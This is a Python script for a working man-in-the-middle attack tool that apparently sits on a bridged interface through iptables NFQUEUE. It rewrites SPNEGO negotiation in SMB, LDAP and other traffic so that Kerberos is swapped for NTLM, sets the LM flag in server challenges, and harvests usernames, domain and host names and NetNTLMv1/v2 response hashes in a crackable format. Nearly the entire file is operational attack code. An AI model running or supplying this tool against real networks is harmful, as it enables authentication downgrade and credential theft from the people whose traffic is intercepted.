#!/usr/bin/env python
from __future__ import print_function ## python3 print function

## general imports
import nfqueue
import binascii
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from datetime import datetime
import subprocess

class PacketMOD:
	QUEUE = None
	TIMEFORMAT = "%H:%M:%S"
	WILDCARD = '*'
	IPv4 = None

	@classmethod
	def accept_packet(self, payload, pkt):
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

	@classmethod
	def drop_packet(self, payload, pkt):
		payload.set_verdict_modified(nfqueue.NF_DROP, str(pkt), len(pkt))

	@classmethod
	def callback(self, payload):
		try:
			data = payload.get_data()
			pkt = IP(data)
			src_ip = pkt[IP].src
			dest_ip = pkt[IP].dst
			## accept all packets per default
			accept = True

			## do not log files which doesn't need to be logged
			log_data_chunk = False

			## call all SPENGO
			res = SPNegoMod.callback(pkt, payload)
			pkt = res['pkt']
			accept = res['accept']
			## accept or drop
			if( accept ):
				## accept packet
				self.accept_packet(payload, pkt)
			else:
				self.drop_packet(payload, pkt)
		except KeyboardInterrupt:
			self.exit(self.INTERFACES)


	@classmethod
	def get_interface(self):
		## get all interface
		grep_call = "ip a | grep -o -e '[0-9]:\s.*[0-9]:' | awk -F: '{print $2}'"
		interfaces = self.sys_check_output(grep_call, shell=True)
		interface_choices = {}
		for idx, interface in enumerate(interfaces.split(' ')):
			interface_choices[idx] = interface.encode('utf-8', errors='ignore')
		choices = self.choose(interface_choices, 'Please choose the interface on which you would like to capture traffic')
		ret_interfaces = []
		for choice in choices:
			ret_interfaces.append(interface_choices[choice])
		return ret_interfaces

	@classmethod
	def get_ip(self, interface, ip_version=4):
		if( interface ):
			if( ip_version == 4 ):
				grep_call = "ip -4 -o addr show %s | grep -o 'inet.*' | cut -d ' ' -f2 | cut -d/ -f1" %(interface)
			else:
				grep_call = "ip -6 -o addr show %s | grep -o 'inet.*' | cut -d ' ' -f2 | cut -d/ -f1" %(interface)
			return self.sys_check_output(grep_call, shell=True)
		else:
			return None

	@classmethod
	def choose(self, clist, prompt):
		message = prompt + '\r\n'
		for item in clist:
			message += '%s: %s\r\n' %(item, clist[item])
		message += 'Number of choice (can be multiple separated by ","): '
		while True:
			inputstr = input(message)
			for choice in inputstr:
				if clist is not None:
					if choice in clist:
						valid = True
					else:
						valid = False
						print(clist)
						print("your choice was: ", inputstr)
						print("Please enter valid values from %s" %clist )
						break
			if valid:
				return inputstr

	@classmethod
	def sys_check_output(self, args, shell=False, strip_flag=True):
		try:
			out = subprocess.check_output(args, shell=shell, universal_newlines=False)
		except subprocess.CalledProcessError as e:
			out = e.output.decode('utf-8')
			## catch exception where return code is 1
			## typically 0=True, 1=False, 2=Error
			if e.returncode != 1:
				raise
			else:
				if( strip_flag ):
					return out.strip().replace('\n', '')
				else:
					return out.strip().replace('\n', ' ')
		else:
			out = out.decode('utf-8')
			if( strip_flag ):
				return out.strip().replace('\n', '')
			else:
				return out.strip().replace('\n', ' ')

	@classmethod
	def setup(self, interfaces):
		PacketMOD.print('## Setup ...', end='')
		## setup iptables
		for interface in interfaces:
			iptables_args = [
			'sudo',
			'iptables',
			'-A',
			'FORWARD',
			'-m',
			'physdev',
			'--physdev-in',
			'%s' %(interface),
			'-j',
			'NFQUEUE',
			'--queue-num',
			'1',
			]
			proc = subprocess.Popen(iptables_args, stdin=None, stdout=None, stderr=None)
			proc.wait()
		print('Done!')

	@classmethod
	def exit(self, interfaces):
		## stop time
		SPNegoMod.STATS['stop_time'] = datetime.now()
		## print stats
		time_diff = SPNegoMod.STATS['stop_time'] - SPNegoMod.STATS['start_time']
		PacketMOD.print('### STATS ###')
		PacketMOD.print('[*] Connections successfully downgraded: %s ' %(SPNegoMod.STATS['downCounts']) )
		PacketMOD.print('[*] User NTLM response hashes captured: %s ' %( len(SPNegoMod.STATS['accounts']) ) )
		PacketMOD.print('[*] Capture time: %s(h)' %(time_diff) )
		## cleanup
		self.cleanup(interfaces)

	@classmethod
	def cleanup(self, interfaces):
		PacketMOD.print("## [SHUTDOWN] Cleaning up...")
		try:
			## close QUEUE
			self.QUEUE.unbind(socket.AF_INET)
			self.QUEUE.close()
			## write file
			#file_path = self.capture_chunk_file_name()
			#self.move_file(file_path, self.LOG_DIR)
		except:
			## do not care for errors during cleanup
			pass
		## remove iptables
		for interface in interfaces:
			try:
				iptables_args = [
				'sudo',
				'iptables',
				'-D',
				'FORWARD',
				'-m',
				'physdev',
				'--physdev-in',
				'%s' %(interface),
				'-j',
				'NFQUEUE',
				'--queue-num',
				'1',
				]
				proc = subprocess.Popen(iptables_args, stdin=None, stdout=None, stderr=None)
				proc.wait()
			except:
				print('An error occured during the cleanup of the iptables. Please review your iptables manually.')
				pass

	@classmethod
	def print(self, msg, end=None):
		## print to stdout
		print(msg, end=end)
		## print to log file
		if( self.LOG_FILE ):
			try:
				self.LOG_FILE_HANDLE.write(msg+'\n')
			except:
				print("Error while writing to '%s'" %(self.LOG_FILE))

	@classmethod
	def run(self, interfaces=None, log_file=None, keep_smb_down=False):
		## prepare
		if(log_file is None):
			self.LOG_FILE = 'spnegodown_out.txt'
		else:
			self.LOG_FILE = log_file
		## open file
		self.LOG_FILE_HANDLE = open(self.LOG_FILE, 'w')
		## infos
		if( interfaces is None ):
			self.INTERFACES = self.get_interface()
		else:
			self.INTERFACES = interfaces.replace(' ', '').split(',')
		## keep_smb_down
		SPNegoMod.KEEP_SMB_DOWN = keep_smb_down
		## setup
		self.setup(self.INTERFACES)
		## start
		PacketMOD.print('## Starting...')
		PacketMOD.print('## Interfaces: %s' %self.INTERFACES )
		PacketMOD.print('## Logging to: %s' %self.LOG_FILE )
		PacketMOD.print('## Set up intercepting queue ...', end='')
		q = nfqueue.queue()
		q.open()
		q.bind(socket.AF_INET)
		q.set_callback(self.callback)
		q.create_queue(1)
		self.QUEUE = q
		PacketMOD.print("finish!")
		PacketMOD.print("## Waiting for packets\n")
		while True:
			try:
				q.try_run() # Main loop
			except KeyboardInterrupt:
				try:
					self.exit(self.INTERFACES)
					## close file
					try:
						self.LOG_FILE_HANDLE.close()
					except:
						pass
				except KeyboardInterrupt:
					pass
				break


class SPNegoMod(PacketMOD):

	## Const
	DEBUG = True
	SPNEGO_INDICATOR = "\x2b\x06\x01\x05\x05\x02"
	NTLMSSP_INDICATOR = "NTLMSSP"
	SMB2_PKT_INDICATOR = '\xfeSMB'
	KEEP_SMB_DOWN = False
	SMB_DOWN_THRESHOLD = 10
	CHALLENGE_ACKS = {}
	STATS = {
		'accounts': [],
		'downCounts': 0,
		'start_time': datetime.now(),
		'stop_time': None
	}
	## Blacklist mechType OIDs
	SPNEGO_OID_MECH_TYPE_BLACKLIST_HEX = [
		'2b06010401823702021e', #MechType: 1.3.6.1.4.1.311.2.2.30 (NEGOEX - SPNEGO Extended Negotiation Security Mechanism)
		'2a864882f712010202', #MechType: 1.2.840.48018.1.2.2 (MS KRB5 - Microsoft Kerberos 5)
		'2a864886f712010202', #MechType: 1.2.840.113554.1.2.2 (KRB5 - Kerberos 5)
		'2a864886f71201020203' #MechType: 1.2.840.113554.1.2.2.3 (KRB5 - Kerberos 5 - User to User)
	]

	@classmethod
	def callback(self, pkt, payload):
		## accept all packets per default
		accept_packet = True
		log_data_chunk = False
		packet_tampered = False

		if( pkt.haslayer(TCP) and
			pkt.haslayer(Raw)
		):
			srcp = pkt[TCP].sport
			destp = pkt[TCP].dport
			src_ip = pkt[IP].src
			dest_ip = pkt[IP].dst
			ack = pkt[TCP].ack
			seq = pkt[TCP].seq
			load = pkt[Raw].load

			if( srcp == 53 or destp == 53 ):
				## DNS refuses downgrade
				pass
			else:
				### Attempt Downgrade
				return_data = self.spnegoDown(pkt, srcp, destp, src_ip, dest_ip, ack, seq, load, payload)

				### Attempt to read creds from NTLMSSP
				self.readNTLMSSP(pkt, srcp, destp, src_ip, dest_ip, ack, seq, load, payload)

				return return_data

		return {
				'pkt': pkt,
				'accept': accept_packet,
				'log_data_chunk': log_data_chunk
			}


	@classmethod
	def readNTLMSSP(self, pkt, srcp, destp, src_ip, dest_ip, ack, seq, load, payload):
		attemptDowngrade = False
		downgradeSucc = False
		downgradedIsSMB = False
		accept_packet = True
		log_data_chunk = False
		packet_tampered = False

		if( self.NTLMSSP_INDICATOR in load ):
			## extract NTLM Response
			ntlmssp_auth_index = load.index('NTLMSSP')
			ntlmssp_blob = load[ntlmssp_auth_index:]
			offset_after_ntlmssp_identifier = 7+1 ## NTLMSSP = 7 chars + zero byte

			### NTLMSSP message type
			ntlmssp_message_type = ntlmssp_blob[offset_after_ntlmssp_identifier:offset_after_ntlmssp_identifier+4]
			ntlmssp_message_type_int = int(struct.unpack('i', ntlmssp_message_type)[0])
			## NTLMSSP Challenge
			if( ntlmssp_message_type_int == 2 ):
				ServerChallenge = binascii.hexlify(ntlmssp_blob[24:32]).decode('utf-8')
				## remember challenge
				if len(self.CHALLENGE_ACKS) > 300:
					self.CHALLENGE_ACKS.popitem()
				self.CHALLENGE_ACKS[ack] = ServerChallenge

				#Set LM Flag
				load = load[:ntlmssp_auth_index+20] + "\x95" + load[ntlmssp_auth_index+21:]
				packet_tampered = True


			## unused fields
			#ntlmssp_authentication_token = ntlmssp_blob[offset_after_ntlmssp_identifier:offset_after_ntlmssp_identifier+4]
			#ntlmssp_authentication_token_int = struct.unpack('i', ntlmssp_authentication_token)[0]
			#lan_manager_length = ntlmssp_blob[offset_after_ntlmssp_identifier+4:offset_after_ntlmssp_identifier+6]
			#lan_manager_max_length = ntlmssp_blob[offset_after_ntlmssp_identifier+6:offset_after_ntlmssp_identifier+8]
			#lan_manager_offset = ntlmssp_blob[offset_after_ntlmssp_identifier+8:offset_after_ntlmssp_identifier+12]
			ntlm_response_length = ntlmssp_blob[offset_after_ntlmssp_identifier+12:offset_after_ntlmssp_identifier+14]
			ntlm_response_length_int = struct.unpack('h', ntlm_response_length)[0]
			#ntlm_response_max_length = ntlmssp_blob[offset_after_ntlmssp_identifier+14:offset_after_ntlmssp_identifier+16]
			ntlm_response_offset = ntlmssp_blob[offset_after_ntlmssp_identifier+16:offset_after_ntlmssp_identifier+20]
			ntlm_response_offset_int = struct.unpack('i', ntlm_response_offset)[0]
			## domain name --> alternate implementation used
			#ntlm_domain_name_length = ntlmssp_blob[offset_after_ntlmssp_identifier+20:offset_after_ntlmssp_identifier+22]
			#ntlm_domain_name_length_int = struct.unpack('h', ntlm_domain_name_length)[0]
			#ntlm_domain_name_max_length = ntlmssp_blob[offset_after_ntlmssp_identifier+22:offset_after_ntlmssp_identifier+24]
			#ntlm_domain_name_offset = ntlmssp_blob[offset_after_ntlmssp_identifier+24:offset_after_ntlmssp_identifier+28]
			#ntlm_domain_name_offset_int = struct.unpack('i', ntlm_domain_name_offset)[0]
			## user name --> ## alternate implementation used
			#ntlm_user_name_length = ntlmssp_blob[offset_after_ntlmssp_identifier+28:offset_after_ntlmssp_identifier+30]
			#ntlm_user_name_length_int = struct.unpack('h', ntlm_user_name_length)[0]
			#ntlm_user_name_max_length = ntlmssp_blob[offset_after_ntlmssp_identifier+30:offset_after_ntlmssp_identifier+32]
			#ntlm_user_name_offset = ntlmssp_blob[offset_after_ntlmssp_identifier+32:offset_after_ntlmssp_identifier+36]
			#ntlm_user_name_offset_int = struct.unpack('i', ntlm_user_name_offset)[0]
			## host name
			ntlm_host_name_length = ntlmssp_blob[offset_after_ntlmssp_identifier+36:offset_after_ntlmssp_identifier+38]
			if( ntlm_host_name_length ):
				ntlm_host_name_length_int = struct.unpack('h', ntlm_host_name_length)[0]
			else:
				ntlm_host_name_length_int = 0
			#ntlm_host_name_max_length = ntlmssp_blob[offset_after_ntlmssp_identifier+38:offset_after_ntlmssp_identifier+40]
			if( ntlm_host_name_length_int > 0 ):
				try:
					ntlm_host_name_offset = ntlmssp_blob[offset_after_ntlmssp_identifier+40:offset_after_ntlmssp_identifier+44]
					ntlm_host_name_offset_int = struct.unpack('i', ntlm_host_name_offset)[0]
				except:
					## something failed
					ntlm_host_name_length_int = 0
			## NTLM response
			item_map = {}
			if( ntlm_response_length_int > 0 ):
				## ntlm response set
				ntlm_response_blob = ntlmssp_blob[ntlm_response_offset_int:ntlm_response_offset_int+ntlm_response_length_int]
				## unused fields
				#ntlm_response_hmac = ntlm_response_blob[0:16]
				#ntlm_response_header = ntlm_response_blob[16:20]
				#ntlm_response_reserved = ntlm_response_blob[20:24]
				#ntlm_responde_time = ntlm_response_blob[24:32]
				#ntlm_response_client_challenge = ntlm_response_blob[32:40]
				#unkown = ntlm_response_blob[40:44]
				ntlm_response_attribute_blob = ntlm_response_blob[44:]
				resolve_item_map = { ## item_type_number: item_name
					1: {'key:_name': 'NETBIOS_COMPUTER_NAME', 'print_text': "NetBios computer name of NTLM authenticator is: '%s'"},
					2: {'key_name': 'NETBIOS_DOMAIN_NAME', 'print_text': "NetBios domain name of NTLM authenticator is: '%s'"},
					3: {'key_name': 'DNS_COMPUTER_NAME', 'print_text': "DNS computer name of NTLM authenticator is: '%s'"},
					4: {'key_name': 'DNS_DOMAIN_NAME', 'print_text': "DNS domain name of NTLM authenticator is: '%s'"},
					5: {'key_name': 'DNS_TREE_NAME', 'print_text': "DNS tree name of NTLM authenticator is: '%s'"},
					## 6: Flags
					## 7: Timestamp
				}
				## ntlm response attributes
				while( True ):
					try:
						ntlm_response_item_type = ntlm_response_attribute_blob[0:2]
						ntlm_response_item_type_int = struct.unpack('h', ntlm_response_item_type)[0]
						ntlm_response_item_length = ntlm_response_attribute_blob[2:4]
						ntlm_response_item_length_int = struct.unpack('h', ntlm_response_item_length)[0]
						## respect only the first five attribute types
						if( ntlm_response_item_type_int in [1,2,3,4,5] ):
							ntlm_response_item_name = ntlm_response_attribute_blob[4:4+ntlm_response_item_length_int]
							ntlm_response_item_name_unicode = ntlm_response_item_name.decode('utf-8').replace("\0", "")
							## save item
							item_map[ntlm_response_item_type_int] = ntlm_response_item_name_unicode
						## break conditions
						if( ntlm_response_item_type_int == 0 ):
							## end of list
							break
						elif( len(ntlm_response_attribute_blob) <= 0 ):
							## end
							break
						else:
							## continue
							ntlm_response_attribute_blob = ntlm_response_attribute_blob[4+ntlm_response_item_length_int:]
					except:
						## some error occured
						break

			## extract NTLM Response
			ntlm_response_hash = None
			domain_name = None
			user_name = None
			host_name = None
			try:
				lmlen, lmmax, lmoff, ntlen, ntmax, ntoff, domlen, dommax, domoff, userlen, usermax, useroff = struct.unpack("12xhhihhihhihhi", ntlmssp_blob[:44])
			except:
				## an error occured ... most propably because of anonymous session setup
				pass
			else:
				lmhash = binascii.b2a_hex(ntlmssp_blob[lmoff:lmoff+lmlen])
				nthash = binascii.b2a_hex(ntlmssp_blob[ntoff:ntoff+ntlen])
				lmhash = lmhash.decode('utf-8')
				nthash = nthash.decode('utf-8')
				if( lmhash and nthash ):
					downgradeSucc = True
				## user and domain
				try:
					domain_name = ntlmssp_blob[domoff:domoff+domlen].decode('utf-8').replace("\0", "")
				except:
					domain_name = "[PARSING ERROR]"
				try:
					user_name = ntlmssp_blob[useroff:useroff+userlen].decode('utf-8').replace("\0", "")
				except:
					user_name = "[PARSING ERROR]"
				## challenge
				if( seq in self.CHALLENGE_ACKS ):
					challenge = self.CHALLENGE_ACKS[seq]
				else:
					challenge = 'CHALLENGE NOT FOUND'
				if( ntlen == 24 ): #NTLMv1
					ntlm_response_hash = '%s %s' % ('NETNTLMv1:', user_name+"::"+domain_name+":"+lmhash+":"+nthash+":"+challenge)
				elif( ntlen > 60 ): #NTLMv2
					ntlm_response_hash = '%s %s' % ('NETNTLMv2:', user_name+"::"+domain_name+":"+challenge+":"+nthash[:32]+":"+nthash[32:])

			## alternate implementation
			## parse domain name
			#if( ntlm_domain_name_length_int > 0 ):
			#	domain_name = ntlmssp_blob[ntlm_domain_name_offset_int:ntlm_domain_name_offset_int+ntlm_domain_name_length_int]
			## parse user name
			#if( ntlm_user_name_length_int > 0 ):
			#	user_name = ntlmssp_blob[ntlm_user_name_offset_int:ntlm_user_name_offset_int+ntlm_user_name_length_int]

			## parse host name
			if( ntlm_host_name_length_int > 0 ):
				host_name = ntlmssp_blob[ntlm_host_name_offset_int:ntlm_host_name_offset_int+ntlm_host_name_length_int]

			## Print results
			if( downgradeSucc ):
				if( self.SMB2_PKT_INDICATOR in load  ):
					print("#### SPNEGO Downgrade in SMBv2 ####")
					downgradedIsSMB = True
				elif( srcp == 389 or destp == 389 ):
					print("#### SPNEGO Downgrade in LDAP  ####")
				else:
					print("#### SPNEGO Downgrade at Src.Port: %s - Dst.Port: %s ####" %(srcp, destp) )

			if( user_name ):
				PacketMOD.print("[+] User '%s' found to be on '%s'" %(user_name, src_ip) )
			if( domain_name and domain_name != '[PARSING ERROR]' ):
				PacketMOD.print("[+] Domain name is: '%s'" %(domain_name))
			if( host_name ):
				PacketMOD.print("[+] Host name of '%s' is: '%s'" %(src_ip, host_name))
			## resolve item map
			if( item_map and len(item_map.keys()) > 0 ):
				PacketMOD.print("[*] Information about the NTLM authenticator (maybe DC?!):")
			for key in item_map.keys():
				text = resolve_item_map[key]['print_text'] %( item_map[key] )
				PacketMOD.print("[+] %s" %(text) )
			if( ntlm_response_hash ):
				PacketMOD.print("[+] NetNTLM Response found:")
				PacketMOD.print(ntlm_response_hash)
				PacketMOD.print("")
				## remember successfull SMB downgrades
				smbDownCounts = 1 if downgradedIsSMB else 0
				if( src_ip not in self.STATS):
					self.STATS[src_ip] = {
						'smbDownCounts': smbDownCounts
					}
				else:
					self.STATS[src_ip]['smbDownCounts'] += smbDownCounts
				self.STATS['downCounts'] += 1
				## remember user accounts
				if( user_name not in self.STATS['accounts'] ):
					self.STATS['accounts'].append( user_name )

			## prepare packet
			if( packet_tampered ):
				pkt[Raw].load = load
				pkt[IP].len = len(str(pkt))
				## delete checksums
				del pkt[IP].chksum
				del pkt[TCP].chksum

			## return packet
			return {
				'pkt': pkt,
				'accept': accept_packet,
				'log_data_chunk': log_data_chunk
			}

	@classmethod
	def spnegoDown(self, pkt, srcp, destp, src_ip, dest_ip, ack, seq, load, payload):
		accept_packet = True
		log_data_chunk = False
		packet_tampered = False
		attemptDowngrade = False
		## Check if SPNEGO auth
		if( self.SPNEGO_INDICATOR in load ):
			spnego_index = load.index(self.SPNEGO_INDICATOR)
			spnego_oid_length = 6
			spnego_offset = spnego_index + spnego_oid_length
			spnego_module = load[spnego_offset:spnego_offset+1].encode('hex')

			## SMB downgrade
			if( self.SMB2_PKT_INDICATOR in load  ):
				smb2_pkt_index = load.index(self.SMB2_PKT_INDICATOR)
				smb2_pkt = load[smb2_pkt_index:]
				## extract SMB2 header values
				hex_command = smb2_pkt[12:14]#.encode('hex')
				command = int( struct.unpack('h', hex_command)[0] )

				## SMB Negotiate
				if( command == 0):
					## unused fields
					#neg_token_init_length_hex = load[spnego_offset+1:spnego_offset+2].encode('hex')
					#neg_token_init_length_int = int(neg_token_init_length_hex, 16)
					#neg_token_init_length_index = int( spnego_offset + 1 )
					#neg_token_init_length_field_length = 1
					# negTokenInit Construct Sequence
					#neg_token_construct_sequence_length_hex = load[spnego_offset+3:spnego_offset+4].encode('hex')
					#neg_token_construct_sequence_length_int = int(neg_token_construct_sequence_length_hex, 16)
					#neg_token_construct_sequence_index = neg_token_init_length_index + 2
					#neg_token_constrct_sequence_length_field_length = 1
					## neg token sequence element
					neg_token_init_sequence_element = load[spnego_offset+4:spnego_offset+5].encode('hex')
					#neg_token_sequence_element_length_hex = load[spnego_offset+5:spnego_offset+6].encode('hex')
					#neg_token_sequence_element_length_int = int(neg_token_sequence_element_length_hex ,16)
					#neg_token_sequence_element_length_index = neg_token_construct_sequence_index + 2
					#neg_token_sequence_element_length_field_length = 1
					## neg token sequence length
					neg_token_sequence_length_hex = load[spnego_offset+7:spnego_offset+8].encode('hex')
					neg_token_sequence_length_int = int(neg_token_sequence_length_hex, 16)
					#neg_token_sequence_length_index = neg_token_sequence_element_length_index + 2
					#neg_token_sequence_length_field_length = 1

					## sequence element a0 ==> MechTypesList
					if( neg_token_init_sequence_element == 'a0' ):
						spnego_mech_type_blob_offset = spnego_offset+8
						spnego_mech_type_blob = load[spnego_mech_type_blob_offset:spnego_mech_type_blob_offset+neg_token_sequence_length_int]
						attemptDowngrade = True
				## SMB Session Setup Request
				elif( command == 1):
					neg_token_sequence_length_hex = load[spnego_offset+11:spnego_offset+12].encode('hex')
					neg_token_sequence_length_int = int(neg_token_sequence_length_hex, 16)
					#neg_token_sequence_length_index = neg_token_sequence_element_length_index + 2
					#neg_token_sequence_length_field_length = 1
					spnego_mech_type_blob_offset = spnego_offset+12
					spnego_mech_type_blob = load[spnego_mech_type_blob_offset:spnego_mech_type_blob_offset+neg_token_sequence_length_int]
					attemptDowngrade = True

				## SMB denies the connection after downgrade
				## therefore only downgrade if threshold is not reached
				## or user demands
				if( attemptDowngrade ):
					## explicit statement
					if( self.KEEP_SMB_DOWN or
						src_ip not in self.STATS or
						self.STATS[src_ip]['smbDownCounts'] < self.SMB_DOWN_THRESHOLD
					):
						attemptDowngrade = True
					else:
						attemptDowngrade = False
						PacketMOD.print('[*] Skipped SMB downgrade for %s; Threshold has been reached' %(src_ip) )

			else:
				spnego_mech_type_length_hex = load[spnego_offset+11:spnego_offset+12]
				spnego_mech_type_length_int = int( struct.unpack('b', spnego_mech_type_length_hex)[0] )
				spnego_mech_type_blob_offset = spnego_offset + 12

				spnego_mech_type_blob = load[spnego_mech_type_blob_offset:spnego_mech_type_blob_offset+spnego_mech_type_length_int]

				if( spnego_module == 'a0' ):
					attemptDowngrade = True

			## CHANGE MECH TYPES
			## iterate over all mech types
			iterated_offset = 0
			if( attemptDowngrade ):
				while( True ):
					oid_identifier = spnego_mech_type_blob[iterated_offset:iterated_offset+1].encode('hex')
					if( oid_identifier == '06' ):
						try:
							spnego_mech_type_length_hex = spnego_mech_type_blob[iterated_offset+1:iterated_offset+2].encode('hex')
							spnego_mech_type_length_int = int(spnego_mech_type_length_hex, 16)
							spnego_mech_type = spnego_mech_type_blob[iterated_offset+2:iterated_offset+2+spnego_mech_type_length_int].encode('hex')
						except:
							print("Error parsing mech type")
							break
						if( spnego_mech_type in self.SPNEGO_OID_MECH_TYPE_BLACKLIST_HEX ):
							## blacklisted mech type
							index_of_mech_type = int( spnego_mech_type_blob_offset + iterated_offset )

							length_of_mech_type = len( spnego_mech_type.decode('hex') )
							mech_type_rnd_multp = int( length_of_mech_type - 2 )
							new_mech_type = '2b06' + ('01' * mech_type_rnd_multp )
							insert = '06%s%s' %(spnego_mech_type_length_hex, new_mech_type)
							insert = insert.decode('hex')
							## insert
							load = load[:index_of_mech_type] + insert + load[index_of_mech_type+length_of_mech_type+2:]
							## Mark packet as tampered
							packet_tampered = True
						## increase offset
						iterated_offset += spnego_mech_type_length_int + 2
					else:
						## if not OID number
						break

		## prepare packet
		if( packet_tampered ):
			pkt[Raw].load = load
			pkt[IP].len = len(str(pkt))
			## delete checksums
			del pkt[IP].chksum
			del pkt[TCP].chksum

		## return packet
		return {
			'pkt': pkt,
			'accept': accept_packet,
			'log_data_chunk': log_data_chunk
		}


if __name__ == '__main__':
	## check if root
	if( os.getuid() != 0 ):
		print("[*] Must be run as root...")
		exit(1)
	# python2
	# define argparser
	parser = argparse.ArgumentParser(description="Let's mod packets...")
	# currently not implemented
	parser.add_argument('-i', '--interfaces', dest='interfaces', help='Specify interfaces to listen to (comma separated)')
	parser.add_argument('-l', '--log', dest='log_file', help='Specify a file to log the output')
	parser.add_argument('--keep-smb-down', dest='keep_smb_down', action='store_true', help='Keep all SMB connections downgraded. Caution: Could lead to denial of service')

	args = parser.parse_args()
	## warn about SMB
	if( not args.keep_smb_down ):
		print('## PLEASE NOTE ##')
		print('Since SMBv2 will refuse any downgraded connections only a few attempts will be made to downgrade SMB, all subsequent connections will be passed trough without tampering.')
		print("If you wish to keep all SMB connections downgraded use the flag '--keep-smb-down'")
		print('####\n')
	## run
	PacketMOD.run(interfaces=args.interfaces,log_file=args.log_file, keep_smb_down=args.keep_smb_down)
